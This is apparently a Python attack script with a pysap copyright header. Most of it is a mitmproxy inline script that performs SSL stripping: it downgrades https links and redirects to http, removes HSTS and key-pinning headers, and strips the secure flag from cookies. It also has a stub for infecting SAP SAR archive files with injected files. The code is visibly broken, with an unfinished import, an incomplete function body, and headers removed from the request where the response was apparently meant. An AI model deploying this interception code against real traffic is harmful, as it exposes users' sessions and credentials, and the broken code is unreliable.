#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2012-2016 by Martin Gallo, Core Security
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

# Standard imports
import re
# External imports
from six.moves import urllib
from netlib.http import decoded
# Custom imports
from pysap.SAPCAR 


def infect_sar_file(length, sar_file, inject_files):
    """ Receives a SAR file

    :type length: int
    :param length: length of the SAR file

    :type sar_file: string
    :param sar_file: content of the SAR file to infect

    :type inject_files: list of strings
    :param inject_files: list of files to inject into the SAR file

    :rtype: tuple of int, string
    :return: the new SAR file with the files injected
    """
    sar = SAPCar


def start(context, argv):
    # set of SSL/TLS capable hosts
    context.secure_hosts = set()


def request(context, flow):

    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in context.secure_hosts :
        flow.request.scheme = 'https'
        flow.request.port = 443


def response(context, flow):

    with decoded(flow.response):
        flow.request.headers.pop('Strict-Transport-Security', None)
        flow.request.headers.pop('Public-Key-Pins', None)

        # strip links in response body
        flow.response.content = flow.response.content.replace('https://', 'http://')

        # strip links in 'Location' header
        if flow.response.headers.get('Location','').startswith('https://'):
            location = flow.response.headers['Location']
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                context.secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        # strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)
